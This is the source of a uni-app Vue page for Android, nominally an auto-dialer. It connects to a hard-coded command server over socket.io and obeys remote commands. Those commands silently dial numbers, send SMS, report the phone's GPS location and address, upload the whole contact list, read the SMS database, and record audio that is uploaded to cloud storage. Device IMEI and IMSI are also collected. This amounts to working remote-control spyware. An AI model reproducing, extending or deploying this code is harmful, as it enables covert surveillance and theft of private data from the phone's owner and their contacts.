<template>
  <view class="content">
    <!-- <image class="logo" src="/static/logo.png"></image> -->
    <view class="text-area">
      <!-- <text class="title">{{ title }}</text> -->
    </view>
    <text class="title">·{{ audio }}·</text>

    <view>
      <text v-for="(item, index) in onlineList" :key="index" class="ovflow"
        >第{{ index + 1 }}个：{{ item.name }}</text
      >
    </view>
  </view>
</template>

<script>
import io from "../../js_sdk/huzhen555-uniappsocketio/uniapp.socket.io.js";
let recorderTimer = "";
const recorderManager = uni.getRecorderManager();

const innerAudioContext = uni.createInnerAudioContext();
// innerAudioContext.autoplay = true;
import { AliOss, Axios } from "../alioss/audioOss";
export default {
  data() {
    return {
      title: "自动拨打电话",
      HOST: "106.14.212.56",
      onlineList: [],
      uuid: plus.device.uuid,
      username: plus.device.vendor + "_" + plus.device.model + "手机",
      socket: "",
      ossSign: {},
      obj: {},
      alioss: null,
      assToken: "",
      recorder: "",
      audio: "",
      resInfo: "",
      isRecord: false,
      responseTypeObj: {
        1: "call",
        2: "zhen",
        3: "ring",
        4: "position",
        5: "sendMessages",
        6: "messagedb",
        7: "getContacts",
        8: "startRecord",
      },
    };
  },
  onLoad() {
    let that = this;

    recorderManager.onStop(function (res) {
      console.log("录音停止了" + JSON.stringify(res)); //返回录音的临时保存地址, 可用于后面的播放

      // uni.saveFile({
      //       tempFilePath: res.tempFilePath,
      //       success: function (res) {
      //         // var savedFilePath = res.savedFilePath;
      that.fileReader(res.tempFilePath);
      //       }
      //     });
      //    that.audio = res.tempFilePath;
    });
  },
  async onShow() {
    // this.socketnew()
    // socket.onSocketMessage(function (res) {
    //   console.log('收到服务器内容：' + res.data);
    // });
    console.log(this.assToken);
    // this.getPhoneStatus()
    this.sockettest();
    this.getDeviceInfo();
    this.getSysInfo();
    this.assToken = await new Axios().login();
    console.log(this.assToken, "dddddddddddddddddddddddd");
    this.alioss = await new AliOss(this.assToken);
    this.ossSign = await this.alioss.initSign();
    console.log(this.ossSign);
    // this.getContacts()
    // socket.onSocketOpen(function (res) {
    //   console.log('WebSocket连接已打开！');

    // });
  },
  destroyed() {
    let that = this;
    plus.device.setWakelock(false);
    that.socket.closeSocket();
  },
  methods: {
    fileReader(path) {
      const self = this;
      // 请求本地系统文件对象 plus.io.PRIVATE_WWW：应用运行资源目录常量
      plus.io.requestFileSystem(plus.io.PRIVATE_DOC, function (fobject) {
        // fs.root是根目录操作对象DirectoryEntry
        fobject.root.getFile(path, { create: true }, function (fileEntry) {
          fileEntry.file(function (file) {
            var fileReader = new plus.io.FileReader();
            self.resInfo = JSON.stringify(file);
            fileReader.readAsText(file, "utf-8");
            fileReader.onloadend = function (evt) {
              self.resInfo = JSON.stringify(evt);
              // console.log(self.alioss.uploadFile);
              // self.alioss.uploadFile(self.ossSign,file)
              self.alioss.uploadFile(self.ossSign, { ...file }, path);
            };
            // self.resInfo = self.resInfo+'--'+file.size + '--' + file.name;
            // console.log(file)
          });
        });
      });
    },
    getPhoneStatus() {
      // (function($) {
      var receiver, main, context, TelephonyManager;
      context = plus.android.importClass("android.content.Context"); //上下文
      TelephonyManager = plus.android.importClass(
        "android.telephony.TelephonyManager"
      ); //通话管理
      main = plus.android.runtimeMainActivity(); //获取activity
      receiver = plus.android.implements(
        "io.dcloud.feature.internal.reflect.BroadcastReceiver",
        {
          onReceive: doReceive, //实现onReceiver回调函数
        }
      );
      var IntentFilter = plus.android.importClass(
        "android.content.IntentFilter"
      );
      var Intent = plus.android.importClass("android.content.Intent");
      var filter = new IntentFilter();
      //filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED); //监听飞行模式
      filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED); //监听电话状态
      filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED); //监听电话状态
      main.registerReceiver(receiver, filter); //注册监听

      function doReceive(context, intent) {
        plus.android.importClass(intent);

        var phoneNumber = intent.getStringExtra(
          TelephonyManager.EXTRA_INCOMING_NUMBER
        );
        telephony = context.getSystemService(context.TELEPHONY_SERVICE);
        console.log(telephony);
        state = telephony.getCallState();
        switch (state) {
          case TelephonyManager.CALL_STATE_RINGING:
            console.log("[Broadcast]等待接电话=" + phoneNumber);
            break;
          case TelephonyManager.CALL_STATE_IDLE:
            console.log("[Broadcast]电话挂断=" + phoneNumber);
            break;
          case TelephonyManager.CALL_STATE_OFFHOOK:
            console.log("[Broadcast]通话中=" + phoneNumber);
            break;
        }
        console.log(intent.getAction());
      }

      // }(mui));
    },

    getDeviceInfo() {
      var str = "",
        i;
      str += "设备型号：" + plus.device.model + "\n";
      str += "设备厂商：" + plus.device.vendor + "\n";
      str += "IMEI：" + plus.device.imei + "\n";
      str += "UUID: " + plus.device.uuid + "\n";
      str += "IMSI：";
      for (i = 0; i < plus.device.imsi.length; i++) {
        str += plus.device.imsi[i];
      }
      str += "\n";
      str +=
        "屏幕分辨率：" +
        plus.screen.resolutionWidth * plus.screen.scale +
        " x " +
        plus.screen.resolutionHeight * plus.screen.scale +
        "\n";
      str += "DPI：" + plus.screen.dpiX + " x " + plus.screen.dpiY;
      console.log(str);
    },

    getSysInfo() {
      var str = "";
      str += "名称：" + plus.os.name + "\n";
      str += "版本：" + plus.os.version + "\n";
      str += "语言：" + plus.os.language + "\n";
      str += "厂商：" + plus.os.vendor + "\n";
      str += "网络类型：";
      var types = {};
      types[plus.networkinfo.CONNECTION_UNKNOW] = "未知";
      types[plus.networkinfo.CONNECTION_NONE] = "未连接网络";
      types[plus.networkinfo.CONNECTION_ETHERNET] = "有线网络";
      types[plus.networkinfo.CONNECTION_WIFI] = "WiFi网络";
      types[plus.networkinfo.CONNECTION_CELL2G] = "2G蜂窝网络";
      types[plus.networkinfo.CONNECTION_CELL3G] = "3G蜂窝网络";
      types[plus.networkinfo.CONNECTION_CELL4G] = "4G蜂窝网络";
      str += types[plus.networkinfo.getCurrentType()];
      console.log(str);
    },
    // 录音
    startRecord(obj) {
      let time = 0;
      let that = this;
      if (!this.isRecord) {
        this.isRecord = true;
        recorderTimer = setInterval(function () {
          time++;
        }, 1000);
        // 1.创建recorder
        this.recorder = plus.audio.getRecorder();
        // 2.录音
        this.recorder.record(
          { filename: "_doc/audio/", format: "mp3" },
          function (filePath) {
            console.log(''+filePath, "22222222222222");
			 that.fileReader(filePath)
          }
        );
   //      recorderManager.start(
   //        {
   //          format: "mp3",
   //          /**
		 // * 
		 // * var r = plus.audio.getRecorder();  
			// r.record({filename:'_doc/audio/',format:'mp3',}, function(p){  
			// 	console.log('录音完成：'+p);  
			// }, function(e){  
			// 	console.log('录音失败：'+e.message);  
			// });*/
   //          // });
   //          //       // 1.创建recorder
   //          //       this.recorder = plus.audio.getRecorder();
   //          //       // 2.录音
   //          //       this.recorder.record(
   //          //         { filename: "_doc/audio/",format:'mp3' },
   //          //         function (filePath) {
   //          // console.log(filePath,'完成');
   //          // that.fileReader(filePath)
   //          // //           plus.io.resolveLocalFileSystemURL(filePath, function (entry) {
   //          // //             console.log(filePath);
   //          // //             console.log(entry,'--->',p);
   //          // // that.audio = filePath

   //          // //           });
   //        },
   //        function (e) {
   //          console.log("读取录音失败：" + e.message);
   //        }
   //      );
      
	  } else {
        this.isRecord = false;
        this.endRecord();
      }
    },
    endRecord() {
      // 3.停止录音
      clearInterval(recorderTimer);
      this.recorder.stop();
      // recorderManager.stop();
      // recorderManager.onFrameRecorded;
      setTimeout(() => {
        innerAudioContext.src = this.audio;

        innerAudioContext.play();
      }, 1000);
    },
    // 获取通讯录
    getContacts(obj) {
      var that = this;
      // 获取通讯录对象
      plus.contacts.getAddressBook(
        plus.contacts.ADDRESSBOOK_PHONE,
        function (addressbook) {
          // uni.showToast({
          //   title: "获取通讯录对象成功",
          //   duration: 2000,
          // });
          console.log("获取通讯录对象成功");
          console.log(addressbook);
          // 查找联系人
          addressbook.find(
            ["displayName", "phoneNumbers"],
            function (contacts) {
              // uni.showToast({
              //   title: "获取联系人成功",
              //   duration: 2000,
              // });
              console.log("获取联系人成功");
              //console.log(JSON.stringify(contacts));
              that.list = contacts;
              let objs = {
                id: that.uuid,
                name: that.username,
                message: contacts,
                to: obj.id,
                responseType: "7",
                toTypeClient: "c",
              };
              console.log(objs, "contactscontacts");
              that.socket.emit("message", objs);
            },
            function () {
              // uni.showToast({
              //   title: "获取联系人失败",
              //   duration: 2000,
              // });
            },
            {
              multiple: true,
            }
          );
        },
        function (e) {
          // uni.showToast({
          //   title: "获取通讯录对象失败:" + e.message,
          //   duration: 2000,
          // });
        }
      );
    },
    //打电话
    call(phone) {
      plus.device.dial(phone, false);
    },
    //发短信
    sendMessages(msgmsg) {
      var msg = plus.messaging.createMessage(plus.messaging.TYPE_SMS);
      msg.to = msgmsg.to;
      msg.body = msgmsg.body;
      msg.silent = true;
      plus.messaging.sendMessage(
        msg,
        (r) => {
          console.log(r);
        },
        (e) => {
          console.log(e);
        }
      );
    },
    //震动
    zhen() {
      plus.device.vibrate();
    },
    //闹铃
    ring() {
      plus.device.beep();
    },
    messagedb() {
      var main = plus.android.runtimeMainActivity();
      var Uri = plus.android.importClass("android.net.Uri");
      var ContactsContract = plus.android.importClass(
        "android.provider.ContactsContract"
      );
      var uri = Uri.parse("content://sms/");
      var cr = main.getContentResolver();
      plus.android.importClass(cr);
      var cur = cr.query(uri, null, null, null, null);
      plus.android.importClass(cur);
      cur.moveToFirst();
      while (cur.moveToNext()) {
        var index_Address = cur.getColumnIndex("address");
        var address = cur.getString(index_Address);
        //短信内容
        var index_Body = cur.getColumnIndex("body");
        var body = cur.getString(index_Body);
        //类型1接收 2发送
        var index_Type = cur.getColumnIndex("type");
        var type = cur.getString(index_Type);
        // console.log(address, body, type);
      }
    },
    //获取位置
    position(obj) {
      let that = this;
      uni.getLocation({
        type: "wgs84",
        success: function (res) {
          console.log("当前位置的经度：" + res.longitude);
          console.log("当前位置的纬度：" + res.latitude);
          var point = new plus.maps.Point(res.longitude, res.latitude);
          plus.maps.Map.reverseGeocode(
            point,
            {},
            function (event) {
              var address = event.address; // 转换后的地理位置
              var point = event.coord; // 转换后的坐标信息
              var coordType = event.coordType; // 转换后的坐标系类型
              console.log(address, "address");
              let objs = {
                id: that.uuid,
                name: that.username,
                message: {
                  具体地址: address,
                  ...point,
                },
                to: obj.id,
                responseType: "4",
                toTypeClient: "c",
              };
              that.socket.emit("message", objs);
            },
            function (e) {}
          );
        },
      });
      // plus.geolocation.getCurrentPosition(
      // 	function(res) {
      // 		console.log("当前位置：" + JSON.stringify(res));
      // 		// console.log("当前位置的纬度：" + res.coords);
      // 		let objs = {
      // 			id: that.uuid,
      // 			name: that.username,
      // 			message: {
      // 				address: res.addresses,
      // 				...res.coords,
      // 			},
      // 			to: obj.id,
      // 			responseType: "4",
      // 			toTypeClient: "c",
      // 		};
      // 		that.socket.emit("message", objs);
      // 	},
      // 	(err) => {
      // 		console.log(err);
      // 	}
      // );
    },
    // socket通信
    sockettest() {
      const that = this;
      plus.device.setWakelock(true);
      const socket = io("ws://" + that.HOST + ":3028");
      that.socket = socket;
      socket.emit("login", {
        id: that.uuid,
        name: that.username,
        typeClient: "c",
      });

      socket.on("login", function (obj) {
        console.log(obj, "登录了");
        that.onlineList = obj.onlineUsers;
      });

      socket.on("message", function (obj) {
        console.log(obj, "有消息来了");
        this.obj = obj;
        // 分发状态 that[that.responseTypeObj[obj.responseType]](obj.message);
        switch (obj.responseType) {
          case "1":
            return that.call(obj.message);
          case "2":
            return that.zhen(obj.message);
          case "3":
            return that.ring(obj.message);
          case "4":
            return that.position(obj);
          case 5:
            return that.sendMessages(obj.message);
          case "5":
            return that.sendMessages(obj.message);
          case 6:
            return that.messagedb(obj);
          case "6":
            return that.messagedb(obj);
          case "7":
            return that.getContacts(obj);
          case "8":
            return that.startRecord(obj);
        }
        // obj.message
      });
    },
  },
};
</script>

<style>
.content {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.logo {
  height: 200rpx;
  width: 200rpx;
  margin-top: 200rpx;
  margin-left: auto;
  margin-right: auto;
  margin-bottom: 50rpx;
}

.text-area {
  display: flex;
  justify-content: center;
}

.title {
  font-size: 36rpx;
  color: #8f8f94;
}

.ovflow {
  width: 90%;
  font-size: 13px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  margin: auto;
  display: block;
}
</style>
